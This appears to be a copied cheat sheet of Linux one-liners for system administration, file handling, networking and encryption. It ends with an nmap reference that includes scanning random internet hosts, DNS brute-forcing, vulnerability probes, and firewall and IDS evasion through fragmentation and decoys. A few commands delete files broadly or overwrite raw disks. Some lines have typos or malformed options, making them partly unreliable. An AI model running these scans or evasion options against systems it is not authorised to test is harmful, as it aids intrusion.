# @ref:- https://gist.githubusercontent.com/royalgarter/637a05c3eb4068998e4e67e3481934af/raw/d8ce24c4b60a01a0a29e676045e144ac0b0580a9/oneliner.sh
System information commands
===========================

(*) #su Show only errors and warnings: `dmesg --level=err,warn`
(*) View dmesg output in human readable format: `dmesg -T`
(*) Get an audio notification if a new device is attached to your computer: `dmesg -tW -l notice | gawk '{ if ($4 == "Attached") { system("echo New device attached | espeak") } }`
(*) Dmesg: follow/wait for new kernel messages: `dmesg -w`
(*) The proper way to read kernel messages in realtime.: `dmesg -wx`

(*) Query graphics card: `lspci -nnk | grep -i VGA -A2`
(*) Query sound card: `lspci -nnk | grep -i audio -A2`
(*) Quick and dirty hardware summary: `(printf "\nCPU\n\n"; lscpu; printf "\nMEMORY\n\n"; free -h; printf "\nDISKS\n\n"; lsblk; printf "\nPCI\n\n"; lspci; printf "\nUSB\n\n"; lsusb; printf "\nNETWORK\n\n"; ifconfig) | less`
(*) Percental CPU scaled load average: `printf "System load (1m/5m/15m): "; for l in 1 2 3 ; do printf "%.1f%s" "$(( $(cat /proc/loadavg | cut -f $l -d " ") * 100 / $(nproc) ))" "% "; done; printf "\n"`

`finddevs.sh` (poor man's lsusb):

{{{sh
#!/bin/sh
for sysdevpath in $(find /sys/bus/usb/devices/usb*/ -name dev); do
    (
        syspath="${sysdevpath%/dev}"
        devname="$(udevadm info -q name -p $syspath)"
        [[ "$devname" == "bus/"* ]] && exit
        eval "$(udevadm info -q property --export -p $syspath)"
        [[ -z "$ID_SERIAL" ]] && exit
        echo "/dev/$devname - $ID_SERIAL"
    )
done
}}}

(*) Summarize the size of current directory on disk in a human-readable format: `du -sh`
(*) See free disk space in a human readable format: `df -h`
(*) Currently mounted filesystems in nice layout: `mount | column -t`
(*) Get the top 10 largest files ordered by size descending, starting from the current folder, recursively: `find . -printf '%s %p\n'| sort -nr | head -10`
(*) Find 10 largest folders: `du -hsx * | sort -rh | head -10`

(*) List of commands you use most often: `history | awk '{a[$2]++}END{for(i in a){print a[i] " " i}}' | sort -rn | head`
(*) List of commands you use most often: `history | awk '{print $2}' | sort | uniq -c | sort -rn | head`

(*) Query my external IP address: `curl -4 https://icanhazip.com`
(*) #su List processes that are actively using a port: `netstat -tulpn | grep LISTEN`
(*) List currently running processes: `ps auxww`
(*) List all process of current user (full info): `ps --user NAME -F`
(*) Show most memory intensive process: `ps axch -o cmd:15,%mem --sort=-%mem`
(*) Show most CPU intensive process: `ps axch -o cmd:15,%cpu --sort=-%cpuw`

(*) Show systemctl failed units: `systemctl --failed`
(*) Show the status of a unit: `systemctl status NAMEOFUNIT`
(*) Show all installed services: `systemctl list-unit-files --state=enabled --no-pager`

(*) #su Flash an image onto a USB drive using cat: `cat path/to/archlinux-version-x86_64.iso > /dev/sdx`
(*) #su Flash an image onto a USB drive using cp: `cp path/to/archlinux-version-x86_64.iso /dev/sdx`
(*) #su Flash an image onto a USB drive using dd: `dd bs=4M if=path/to/archlinux-version-x86_64.iso of=/dev/sdx status=progress oflag=sync`
(*) #su Flash an image onto a USB drive using tee: `tee < path/to/archlinux-version-x86_64.iso > /dev/sdx`

(*) #su Mount an ISO: `mount -o loop /path/to/image.iso /media/mountpoint`
(*) #su Rip an ISO: run `isosize -x /dev/sr0` to determine sector count and size, then run `dd if=/dev/sr0 of=discimage.iso bs=SECTOR_SIZE count=SECTOR_COUNT status=progress`

(*) List input devices: `xinput list` (e.g. to see Touchpad input on a laptop)
(*) Disable touchpad (and possibly add to `.xprofile`): `xinput disable 'SynPS/2 Synaptics TouchPad'`

(*) List all running processes: `ps aux`
(*) List all running processes including the full command string: `ps auxww`
(*) Search for a process that matches a string: `ps aux | grep string`
(*) List all processes of the current user in extra full format: `ps --user $(id -u) -F`
(*) List all processes of the current user as a tree: `ps --user $(id -u) f`
(*) Get the parent PID of a process: `ps -o ppid= -p pid`
(*) Sort processes by memory consumption: `ps --sort size`

(*) List all of the signals kill can send: `kill -l`
(*) Hang up process: `kill -1 process_id`
(*) Send interrupt to process: `kill -2 process_id`
(*) Immediately terminate a process: `kill -9 process_id`
(*) Hang up all processes that match a name: `pkill -9 "process_name"`

Fundamental Commands
====================

(*) Invert matching lines with `-v`: `grep -v "roses" poem.txt`
(*) TODO look ahead/behind with `-A`, `-B`, `-C` switches
(*) TODO only keep what grep found with `-o`
(*) Find (grep) files with oldpattern and replace with newpattern: `grep /path/to/search -rl -e "oldpattern" | xargs sed -i "s/oldpattern/newpattern/g"`
(*) Find (grep) strings in files, in current directory, recursively (-r), printing line numbers (-n): `grep "STRING" -rnw .`

(*) Find all files in current directory exclude `.wine` and `.git` directories: `find . -type f \! \( -path '*/\.wine/*' -o -path '*/\.git/*' \)`
(*) Find recently accessed files: `find . -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- | head`
(*) Example. Find files and pipe into xargs (filenames with spaces): `find . -type f -print0 | xargs -0 sxiv -t`
(*) Listing todayâ€™s files only: `find directory_path -maxdepth 1 -daystart -mtime -1`
(*) Find ASCII files and extract IP addresses: `find . -type f -exec grep -Iq . {} \; -exec grep -oE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" {} /dev/null \;`
(*) Find out which directory uses most inodes - list total sum of directoryname existing on filesystem: `find /etc -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n`
(*) Find all executable files across the entire tree: `find  -executable -type f`
(*) Replace recursive in folder with sed: `find <folder> -type f -exec sed -i 's/my big String/newString/g' {} +`
(*) Show contents of all git objects in a git repo: `find .git/objects/ -type f \| sed 's/\.git\/objects\/\///' | sed 's/\///g' | xargs -n1 -I% echo echo "%" \$\(git cat-file -p "%"\) \0 | xargs -n1 -0 sh -c`
(*) Find dupe files by checking md5sum: `find /glftpd/site/archive -type f|grep '([0-9]\{1,9\})\.[^.]\+$'|parallel -n1 -j200%  md5sum ::: |awk 'x[$1]++ { print $2 " :::"}'|sed 's/^/Dupe: /g'|sed 's,Dupe,\x1B[31m&\x1B[0m,'`
(*) Find and remove old backup files: `find /home/ -name bk_all_dbProdSlave_\* -mtime +2 -exec rm -f {} \;`
(*) Find and remove old compressed backup files: `find /home -type f \( -name "*.sql.gz" -o -name "*.tar.gz" -mtime +10 \) -exec rm -rf {} \;`
(*) Shows space used by each directory of the root filesystem excluding mountpoints/external filesystems (and sort the output): `find / -maxdepth 1 -mindepth 1 -type d \! -empty \! -exec mountpoint -q {} \; -exec du -xsh {} + | sort -h`
(*) Shows space used by each directory of the root filesystem excluding mountpoints/external filesystems (and sort the output): `find / -maxdepth 1 -mindepth 1 -type d -exec du -skx {} \; | sort -n`
(*) Create an uncompressed tar file of each child directory of the current working directory: `find . -maxdepth 1 -mindepth 1 -type d -exec tar cvf {}.tar {}  \;`
(*) Tar and bz2 a set of folders as individual files: `find . -maxdepth 1 -type d -name '*screenflow' -exec tar jcvf {}.tar.bz2 {} \;`
(*) Shows space used by each directory of the root filesystem excluding mountpoints/external filesystems (and sort the output): `find / -maxdepth 1 -type d | xargs -I {} sh -c "mountpoint -q {} || du -sk {}" | sort -n`
(*) Zgrep across multiple files: `find . -name "file-pattern*.gz" -exec zgrep -H 'pattern' {} \;`
(*) Code to check if a module is used in python code: `find .  -name "*.ipynb" -exec grep -l "symspellpy" {} \;`
(*) Delete all files by extension: `find / -name "*.jpg" -delete`
(*) Check if the same table name exist across different databases: `find . -name "withdrownblocks.frm"Â  | sort -u | awk -F'/' '{print $3}' | wcÂ  -l`
(*) Count the total amount of hours of your music collection: `find . -print0 | xargs -0 -P 40 -n 1 sh -c 'ffmpeg -i "$1" 2>&1 | grep "Duration:" | cut -d " " -f 4 | sed "s/.$//" | tr "." ":"' - | awk -F ':' '{ sum1+=$1; sum2+=$2; sum3+=$3; sum4+=$4 } END { printf "%.0f:%.0f:%.0f.%.0f\n", sum1, sum2, sum3, sum4 }'`
(*) Graphical tree of sub-directories with files: `find . -print | sed -e 's;[^/]*/;|-- ;g;s;-- |;   |;g'`
(*) Moving large number of files: `find /source/directory -mindepth 1 -maxdepth 1 -name '*'  -print0 | xargs -0 mv -t /target/directory;`
(*) List only empty directories and delete safely (=ask for each): `find . -type d -empty -exec rm -i -R {} \;`
(*) Find ASCII files and extract IP addresses: `find . -type f -exec grep -Iq . {} \; -exec grep -oE "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" {} /dev/null \;`
(*) Remove scripts tags from *.html and *.htm files under the current directory: `find ./ -type f \( -iname '*.html' -or -iname '*.htm' \) -exec sed -i '/<script/,/<\/script>/d' '{}' \;`
(*) Recursive search and replace (with bash only): `find ./ -type f -name "somefile.txt" -exec sed -i -e 's/foo/bar/g' {} \;`
(*) Find non-standard files in mysql data directory: `find . -type f -not -name "*.frm" -not -name "*.MYI" -not -name "*.MYD" -not -name "*.TRG" -not -name "*.TRN" -not -name "db.opt"`
(*) Find all file extension in current dir.: `find . -type f | perl -ne 'print $1 if m/\.([^.\/]+)$/' | sort -u`
(*) Find hard linked files (duplicate inodes) recursively: `find . -type f -printf '%10i %p\n' | sort | uniq -w 11 -d -D | less`
(*) Find sparse files: `find -type f -printf "%S=:=%p\n" 2>/dev/null | gawk -F'=:=' '{if ($1 < 1.0) print $1,$2}'`
(*) Find non-ASCII and UTF-8 files in the current directory: `find . -type f -regex '.*\.\(cpp\|h\)' -exec file {} + | grep "UTF-8\|extended-ASCII"`
(*) Replace lines in files with only spaces/tabs with simple empty line (within current directory - recursive): `find . -type f -regex '.*\.\(cpp\|h\)' -exec sed -i 's/^[[:blank:]]\+$//g' {} +`
(*) Find the top 10 directories containing the highest number of files: `find / -type f ! -regex '^/\(dev\|proc\|run\|sys\).*' | sed 's@^\(.*\)/[^/]*$@\1@' | sort | uniq -c | sort -n | tail -n 10`
(*) Find all files that have 20 or more MB on every filesystem, change the size and filesystem to your liking: `find / -type f -size +20000k -exec ls -lh {} \; 2> /dev/null | awk '{ print $NF ": " $5 }' | sort -nrk 2,2`
(*) Find directory with most inodes/files: `find / -xdev -printf '%h\n' | sort | uniq -c | sort -k 1 -n | tail`

(*) Create an archive from files: `tar cf target.tar file1 file2 file3`
(*) Create a gzipped archive from files: `tar czf target.tar.gz file1 file2 file3`
(*) Create a gzipped archive from a directory using relative path: `tar czf target.tar.gz --directory=path/to/directory .`
(*) Extract a (compressed) archive file into the current directory: `tar xf [source.tar.gz|.bz2|.xz]`
(*) Extract a (compressed) archive file into the target directory: `tar xf [source.tar.gz|.bz2|.xz] --directory=directory`
(*) Create a compressed archive from files, using archive suffix to determine the compression program: `tar caf target.tar.xz file1 file2 file3`
(*) List the contents of a tar file verbosely: `tar tvf source.tar`
(*) Extract files matching a pattern: `tar xf source.tar --wildcards "*.html"`

(*) Replace the first occurrence of a regular expression in each line of a file, and print the result: `sed 's/regex/replace/' filename`
(*) Replace all occurrences of an extended regular expression in a file, and print the result: `sed -r 's/regex/replace/g' filename`
(*) Replace all occurrences of a string in a file, overwriting the file (i.e. in-place): `sed -i 's/find/replace/g' filename`
(*) Replace only on lines matching the line pattern: `sed '/line_pattern/s/find/replace/' filename`
(*) Delete lines matching the line pattern: `sed '/line_pattern/d' filename`
(*) Print the first 11 lines of a file: `sed 11q filename`
(*) Apply multiple find-replace expressions to a file: `sed -e 's/find/replace/' -e 's/find/replace/' filename`
(*) Replace separator `/` by any other character not used in the find or replace patterns, e.g., `#`: `sed 's#find#replace#' filename`
(*) Replace strings in text: `sed -e 's/dapper/edgy/g' -i /etc/apt/sources.list`
(*) This will allow you to browse web sites using "-dump" with elinks while you still are logged in: `sed -i 's/show_formhist = 1/show_formhist = 0/;s/confirm_submit = 0/confirm_submit = 1/g' /etc/elinks/elinks.conf; elinks -dump https://facebook.com`
(*) Get line number 12 (or n) from a file: `sed -n '12p;13q' file`
(*) Get a range on line with sed (first two): `sed -n '1,2p;3q' file`
(*) Remove abstracts from a bibtex file: `sed '/^\s*abstract\s*=\s*{[^\n]*},$/ d' input.bib > output.bib`
(*) Delete at start of each line until character: `sed 's/^[^:]*://g'`
(*) Remove all matches containing a string until its next space: `sed 's/linux-[^ ]* \{0,1\}//g' /path/to/file`
(*) Remove ^M characters from file using sed: `sed 's/\r//g' < input.txt >  output.txt`

(*) Comparison between the execution output of the last and penultimate command: `diff <(!!) <(!-2)`
(*) Show the difference: `diff file1 file2 --side-by-side --suppress-common-lines`
(*) Compare mysql db schema from two different servers: `diff <(mysqldump -hsystem db_name --no-data --routines) <(mysqldump -hsystem2 db_name --no-data --routines) --side-by-side --suppress-common-lines --width=690 | more`
(*) Check difference between two file directories recursively: `diff <(tree /dir/one) <(tree /dir/two)`

(*) Close shell keeping all subprocess running: `disown -a && exit`

Pacman
======

(*) Install a package from the main Arch repo: `pacman -S <package name>`
(*) Update and upgrade programs: `pacman -Syu`
(*) Search for programs by string in the main Arch repo: `pacman -Ss <string>`
(*) Search installed programs by string: `pacman -Qs <string>`
(*) Remove a program, its configs and dependencies: `pacman -Rns <package name>`
(*) Search for packages with file: `pacman -Fy filename`
(*) List all programs installed: `pacman -Q`
(*) Programs installed by you: `pacman -Qe`
(*) List all programs installed from the main repo: `pacman -Qn`
(*) List all programs installed from the AUR: `pacman -Qm`
(*) List all programs that are orphaned dependencies: `pacman -Qdt`
(*) Clean up cached packages: `pacman -Sc`
(*) Search and remove found packages: `pacman -Rns $(pacman -Qsq SEARCHSTRING)`
(*) List packages and their sizes: `LC_ALL=C pacman -Qi | wak '/^Name/{name=$3} /^Installed Size/{print $4$5, name}' | sort -h`

Network Manager
===============

(*) Tells you whether NetworkManager is running or not: `nmcli -t -f RUNNING general`
(*) Shows the overall status of NetworkManager: `nmcli -t -f STATE general`
(*) Switches Wi-Fi off: `nmcli radio wifi off`
(*) Lists all connections NetworkManager has: `nmcli connection show`
(*) Shows all configured connections in multi-line mode: `nmcli -p -m multiline -f all con show`
(*) Lists all currently active connections: `nmcli connection show --active`
(*) Shows all connection profile names and their auto-connect property: `nmcli -f name,autoconnect c s`
(*) Shows details for "My default em1" connection profile: `nmcli -p connection show "My default em1"`
(*) Shows details for "My Home Wi-Fi" connection profile with all passwords. Without --show-secrets option, secrets would not be displayed: `nmcli --show-secrets connection show "My Home Wi-Fi"`
(*) Shows details for "My default em1" active connection, like IP, DHCP information, etc: `nmcli -f active connection show "My default em1"`
(*) Shows static configuration details of the connection profile with "My wired connection" name: `nmcli -f profile con s "My wired connection"`
(*) Activates the connection profile with name "My wired connection" on interface eth0. The -p option makes nmcli show progress of the activation: `nmcli -p con up "My wired connection" ifname eth0`
(*) Connects the Wi-Fi connection with UUID 6b028a27-6dc9-4411-9886-e9ad1dd43761 to the AP with BSSID 00:3A:98:7C:42:D3: `nmcli con up 6b028a27-6dc9-4411-9886-e9ad1dd43761 ap 00:3A:98:7C:42:D3`
(*) Shows the status for all devices: `nmcli device status`
(*) Disconnects a connection on interface em2 and marks the device as unavailable for auto-connecting. As a result, no connection will automatically be activated on the device until the device's 'autoconnect' is set to TRUE or the user manually activates a connection: `nmcli dev disconnect em2`
(*) Shows details for wlan0 interface; only GENERAL and WIFI-PROPERTIES sections will be shown: `nmcli -f GENERAL,WIFI-PROPERTIES dev show wlan0`
(*) Shows all available connection profiles for your Wi-Fi interface wlp3s0: `nmcli -f CONNECTIONS device show wlp3s0`
(*) Lists available Wi-Fi access points known to NetworkManager: `nmcli dev wifi`
(*) Creates a new connection named "My cafe" and then connects it to "Cafe Hotspot 1" SSID using password "caffeine". This is mainly useful when connecting to "Cafe Hotspot 1" for the first time. Next time, it is better to use nmcli con up id "My cafe" so that the existing connection profile can be used and no additional is created: `nmcli dev wifi con "Cafe Hotspot 1" password caffeine name "My cafe"`
(*) Creates a hotspot profile and connects it. Prints the hotspot password the user should use to connect to the hotspot from other devices: `nmcli -s dev wifi hotspot con-name QuickHotspot`
(*) Starts IPv4 connection sharing using em1 device. The sharing will be active until the device is disconnected: `nmcli dev modify em1 ipv4.method shared`
(*) Temporarily adds an IP address to a device. The address will be removed when the same connection is activated again: `nmcli dev modify em1 ipv6.address 2001:db8::a:bad:c0de`
(*) Non-interactively adds an Ethernet connection tied to eth0 interface with automatic IP configuration (DHCP), and disables the connection's autoconnect flag: `nmcli connection add type ethernet autoconnect no ifname eth0`
(*) Non-interactively adds a VLAN connection with ID 55. The connection will use eth0 and the VLAN interface will be named Maxipes-fik: `nmcli c a ifname Maxipes-fik type vlan dev eth0 id 55`
(*) Non-interactively adds a connection that will use eth0 Ethernet interface and only have an IPv6 link-local address configured: `nmcli c a ifname eth0 type ethernet ipv4.method disabled ipv6.method link-local`
(*) Edits existing "ethernet-em1-2" connection in the interactive editor: `nmcli connection edit ethernet-em1-2`
(*) Adds a new Ethernet connection in the interactive editor: `nmcli connection edit type ethernet con-name "yet another Ethernet connection"`
(*) Modifies 'autoconnect' property in the 'connection' setting of 'ethernet-2' connection: `nmcli con mod ethernet-2 connection.autoconnect no`
(*) Modifies 'mtu' property in the 'wifi' setting of 'Home Wi-Fi' connection: `nmcli con mod "Home Wi-Fi" wifi.mtu 1350`
(*) Sets manual addressing and the addresses in em1-1 profile: `nmcli con mod em1-1 ipv4.method manual ipv4.addr "192.168.1.23/24 192.168.1.1, 10.10.1.5/8, 10.0.0.11"`
(*) Appends a Google public DNS server to DNS servers in ABC profile: `nmcli con modify ABC +ipv4.dns 8.8.8.8`
(*) Removes the specified IP address from (static) profile ABC: `nmcli con modify ABC -ipv4.addresses "192.168.100.25/24 192.168.1.1"`
(*) Imports an OpenVPN configuration to NetworkManager: `nmcli con import type openvpn file ~/Downloads/frootvpn.ovpn`
(*) For more Network Manager examples: `man nmcli-examples`

PulseAudio and ALSA (not so much)
=================================

PulseAudio is a general purpose sound server.
It is intended to run as a middleware between your applications and your hardware devices, either using ALSA or OSS.
It also offers easy network streaming across local devices using Avahi if enabled.

NOTE:
PulseAudioclients can send audio to "sinks" and receive audio from "sources".
So sinks are outputs (audio goes there), sources are inputs (audio comes from there).

(*) List all sinks: `pactl list sinks short`
(*) Change the default sink (output) to 1: `pactl set-default-sink 1`
(*) Move sink-input 627 to sink 1: `pactl move-sink-input 627 1`
(*) Set the volume of sink 1 to 75%: `pactl set-sink-volume 1 0.75`
(*) Toggle mute on the default sink (using the special name `@DEFAULT_SINK@`): `pactl set-sink-mute @DEFAULT_SINK@ toggle`

(*) List all sinks and sources with their corresponding IDs: `pamixer --list-sinks --list-sources`
(*) Set the volume to 75% on the default sink: `pamixer --set-volume 75`
(*) Toggle mute on a sink other than the default: `pamixer --toggle-mute --sink ID`
(*) Increase the volume on default sink by 5%: `pamixer --increase 5`
(*) Decrease the volume on a source by 5%: `pamixer --decrease 5 --source ID`
(*) Use the allow boost option to increase, decrease, or set the volume above 100%: `pamixer --set-volume 105 --allow-boost`
(*) Mute the default sink (use `--unmute` instead to unmute): `pamixer --mute`
(*) Create a sink:
  `pacmd load-module module-null-sink sink_name=MySink && pacmd update-sink-proplist MySink device.description=MySink`

Hashes, Passwords, Encryption, and Secrets
==========================================

(*) Compute and check MD5 message digest: `md5sum -c filename.md5`
(*) Generate a SSH key: `ssh-keygen`
(*) Add a key to SSH agent: `eval "$(ssh-agent -s) ` and `ssh-add ~/.ssh/NAMEOFYOURKEY`
(*) Copy `~/.ssh/id_rsa.pub` to remote-server.org: `$ ssh-copy-id -i ~/.ssh/is_rsa.pub username@remote-server.org`
(*) Specify the port that SSH should use: `$ ssh-copy-id -i ~/.ssh/id_ed25519.pub -p 221 username@remote-server.org`
(*) SSH security (make sure you can login using your key first!) `/etc/ssh/sshd_config`: `PasswordAuthentication no` and `PermitRootLogin no`
(*) Use a specific key to copy a file: `scp -i ~/.ssh/private_key local_file remote_host:/path/remote_file`

(*) Allow git to manage the password-store: `pass git init`
(*) Insert a new password for somecompany: `pass insert somecompany`
(*) Show a password for somecompany: `pass somecompany`
(*) Remove a password for somecompany: `pass rm somecompany`
(*) Generate a password for mytest of length 10: `pass generate somecompany 10`
(*) Copy a password (temporarily) to the clipboard: `pass -c somecompany`
(*) Remove password for somecompany: `pass rm somecompany`
(*) find existing passwords that match "company": `pass find *company*`
(*) Add additional info to a password (add info separate lines): `pass edit somecompany`

(*) Sign `doc.txt` without encryption (writes output to `doc.txt.asc`): `gpg --clearsign doc.txt`
(*) Encrypt `doc.txt` for alice@example.com (output to `doc.txt.gpg`): `gpg --encrypt --recipient alice@example.com doc.txt`
(*) Encrypt `doc.txt` with only a passphrase (output to `doc.txt.gpg`): `gpg --symmetric doc.txt`
(*) Decrypt `doc.txt.gpg` (output to stdout): `gpg --decrypt doc.txt.gpg`
(*) Import a public key: `gpg --import public.gpg`
(*) Export public key for alice@example.com (output to stdout): `gpg --export --armor alice@example.com`
(*) Export private key for alice@example.com (output to stdout): `gpg --export-secret-keys --armor alice@example.com`
(*) Make an encrypted archive of local dir/ on remote machine using ssh: `tar -c dir/ | gzip | gpg -c | ssh user@remote 'dd of=dir.tar.gz.gpg'`
(*) Encrypt a file using OpenSSL: `openssl aes-256-cbc -a -salt -iter 5 -in data.tar.gz -out data.enc`
(*) Decrypt a file using OpenSSL: `openssl aes-256-cbc -d -a -iter 5 -in data.enc -out data_decrypted.tar.gz`
(*) Encrypted archive with openssl and tar: `tar --create --file - --posix --gzip -- <dir> | openssl enc -e -aes256 -out <file>`

(*) List SAN domains for a certificate: `echo | openssl s_client -connect google.com:443 2>&1 | openssl x509 -noout -text |  awk -F, -v OFS="\n" '/DNS:/{x=gsub(/ *DNS:/, ""); $1=$1; print $0}'`
(*) Download certificate from FTP: `echo | openssl s_client -servername ftp.domain.com -connect ftp.domain.com:21 -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'`
(*) Download certificate chain from FTP: `echo | openssl s_client -showcerts -connect ftp.domain.com:ftp -starttls ftp 2>/dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'`
(*) Check SSL expiry from commandline: `echo | openssl s_client -showcerts -servername google.com -connect gnupg.org:443 2>/dev/null | openssl x509 -inform pem -noout -text`
(*) SHA256 signature sum check of file: `openssl dgst -sha256  <FILENAME>`
(*) Generate a random password 30 characters long: `openssl rand -rand /dev/urandom -base64 30`
(*) Openssl Generate Self Signed SSL Certifcate: `openssl req -newkey rsa:2048 -nodes -keyout /etc/ssl/private/myblog.key -x509 -days 365 -out /etc/ssl/private/myblog.pem`
(*) Generate a certificate signing request (CSR) for an existing private key. CSR.csr MUST be exists before: `openssl req -out CSR.csr -key privateKey.key -new`
(*) Generate a new private key and Certificate Signing Request. CSR.csr MUST be extist before !: `openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key`
(*) Generate pem cert from host with ssl port: `openssl s_client -connect HOSTNAME.at:443 -showcerts </dev/null 2>/dev/null | openssl x509 -outform PEM > meinzertifikat.pem`
(*) Download SSL/TLS pem format cert from https web host: `openssl s_client -showcerts -connect google.com:443 </dev/null 2>/dev/null|openssl x509 -outform PEM > /tmp/google.com.cer`
(*) Host cpu performance: `openssl speed md5`
(*) Finding the fingerprint of a given certificate: `openssl x509 -in cert.pem -fingerprint -noout`
(*) Generate a certificate signing request based on an existing certificate. certificate.crt MUST be exists before !: `openssl x509 -x509toreq -in certificate.crt -out CSR.csr -signkey privateKey.key`
(*) Connect to a server and show full certificate chain: `openssl s_client -showcerts -host example.com -port 443 </dev/null`

Nmap
====

Target Specification
--------------------
(*) Scan a single IP: `nmap 192.168.1.1`
(*) Scan specific IPs: `nmap 192.168.1.1 192.168.2.1`
(*) Scan a range: `nmap 192.168.1.1-254`
(*) Scan a domain: `nmap scanme.nmap.org`
(*) Scan using CIDR notation: `nmap 192.168.1.0/24`
(*) Scan targets from a file: `nmap -iL targets.txt`
(*) Scan 100 random hosts: `nmap -iR 100`
(*) Exclude listed hosts: `nmap --exclude 192.168.1.1`

Scan Techniques
---------------
(*) TCP SYN port scan (Default): `nmap 192.168.1.1 -sS`
(*) TCP connect port scan (Default without root privilege): `nmap 192.168.1.1 -sT`
(*) UDP port scan: `nmap 192.168.1.1 -sU`
(*) TCP ACK port scan: `nmap 192.168.1.1 -sA`
(*) TCP Window port scan: `nmap 192.168.1.1 -sW`
(*) TCP Maimon port scan: `nmap 192.168.1.1 -sM`

Host Discovery
--------------
(*) No Scan. List targets only: `nmap 192.168.1.1-3 -sL`
(*) Disable port scanning. Host discovery only.: `nmap 192.168.1.1/24 -sn`
(*) Disable host discovery. Port scan only.: `nmap 192.168.1.1-5 -Pn`
(*) TCP SYN discovery on port x. Port 80 by default: `nmap 192.168.1.1-5 -PS22-25,80`
(*) TCP ACK discovery on port x. Port 80 by default: `nmap 192.168.1.1-5 -PA22-25,80`
(*) UDP discovery on port x. Port 40125 by default: `nmap 192.168.1.1-5 -PU53`
(*) ARP discovery on local network: `nmap 192.168.1.1-1/24 -PR`
(*) Never do DNS resolution: `nmap 192.168.1.1 -n`

Port Specifications
-------------------
(*) Port scan for port x: `nmap 192.168.1.1 -p 21`
(*) Port range: `nmap 192.168.1.1 -p 21-100`
(*) Port scan multiple TCP and UDP ports: `nmap 192.168.1.1 -p U:53,T:21-25,80`
(*) Port scan all ports: `nmap 192.168.1.1 -p-`
(*) Port scan from service name: `nmap 192.168.1.1 -p http,https`
(*) Fast port scan (100 ports): `nmap 192.168.1.1 -F`
(*) Port scan the top x ports: `nmap 192.168.1.1 --top-ports 2000`
(*) Leaving off initial port in range makes the scan start at port 1: `nmap 192.168.1.1 -p-65535`
(*) Leaving off end port in range makes the scan go through to port 65535: `nmap 192.168.1.1 -p0-`

Service and Version Detection
-----------------------------
(*) Attempts to determine the version of the service running on port: `nmap 192.168.1.1 -sV`
(*) Intensity level 0 to 9. Higher number increases possibility of correctness: `nmap 192.168.1.1 -sV --version-intensity 8`
(*) Enable light mode. Lower possibility of correctness. Faster: `nmap 192.168.1.1 -sV --version-light`
(*) Enable intensity level 9. Higher possibility of correctness. Slower: `nmap 192.168.1.1 -sV --version-all`
(*) Enables OS detection, version detection, script scanning, and traceroute: `nmap 192.168.1.1 -A`

OS Detection
------------
(*) Remote OS detection using TCP/IP stack fingerprinting: `nmap 192.168.1.1 -O`
(*) If at least one open and one closed TCP port are not found it will not try OS detection against host: `nmap 192.168.1.1 -O --osscan-limit`
(*) Makes Nmap guess more aggressively: `nmap 192.168.1.1 -O --osscan-guess`
(*) Set the maximum number x of OS detection tries against a target: `nmap 192.168.1.1 -O --max-os-tries 1`
(*) Enables OS detection, version detection, script scanning, and traceroute: `nmap 192.168.1.1 -A`

Timing and Performance
----------------------
(*) Paranoid (0) Intrusion Detection System evasion: `nmap 192.168.1.1 -T0`
(*) Sneaky (1) Intrusion Detection System evasion: `nmap 192.168.1.1 -T1`
(*) Polite (2) slows down the scan to use less bandwidth and use less target machine resources: `nmap 192.168.1.1 -T2`
(*) Normal (3) which is default speed: `nmap 192.168.1.1 -T3`
(*) Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network: `nmap 192.168.1.1 -T4`
(*) Insane (5) speeds scan; assumes you are on an extraordinarily fast network: `nmap 192.168.1.1 -T5`

TODO (original website did not have complete examples):
Give up on target after this long: `1s; 4m; 2h`
Specifies probe round trip time: `1s; 4m; 2h`
Parallel host scan group sizes: `50; 1024`
Probe parallelization: `10; 1`
Adjust delay between probes: `20ms; 2s; 4m; 5h`
Specify the maximum number of port scan probe retransmissions
Send packets no slower thanÂ <numberr> per second
Send packets no faster thanÂ <number> per second

NSE Scripts
-----------
(*) Scan with default NSE scripts. Considered useful for discovery and safe: `nmap 192.168.1.1 -sC`
(*) Scan with default NSE scripts. Considered useful for discovery and safe: `nmap 192.168.1.1 --script default`
(*) Scan with a single script. Example banner: `nmap 192.168.1.1 --script=banner`
(*) Scan with a wildcard. Example http: `nmap 192.168.1.1 --script=http*`
(*) Scan with two scripts. Example http and banner: `nmap 192.168.1.1 --script=http,banner`
(*) Scan default, but remove intrusive scripts: `nmap 192.168.1.1 --script "not intrusive"`
(*) NSE script with arguments: `nmap --script snmp-sysdescr --script-args snmpcommunity=admin 192.168.1.1`

Useful NSE Script Examples
--------------------------
(*) http site map generator: `nmap -Pn --script=http-sitemap-generator scanme.nmap.org`
(*) Fast search for random web servers: `nmap -n -Pn -p 80 --open -sV -vvv --script banner,http-title -iR 1000`
(*) Brute forces DNS hostnames guessing subdomains: `nmap -Pn --script=dns-brute domain.com`
(*) Safe SMB scripts to run: `nmap -n -Pn -vv -O -sV --script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1`
(*) Whois query: `nmap --script whois* domain.com`
(*) Detect cross site scripting vulnerabilities: `nmap -p80 --script http-unsafe-output-escaping scanme.nmap.org`
(*) Check for SQL injections: `nmap -p80 --script http-sql-injection scanme.nmap.org`
(*) Example IDS Evasion command: `nmap -f -t 0 -n -Pn â€“data-length 200 -D 192.168.1.101,192.168.1.102,192.168.1.103,192.168.1.23 192.168.1.1`

Firewall / IDS Evasion and Spoofing
-----------------------------------
(*) Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters: `nmap 192.168.1.1 -f`
(*) Set your own offset size: `nmap 192.168.1.1 --mtu 32`
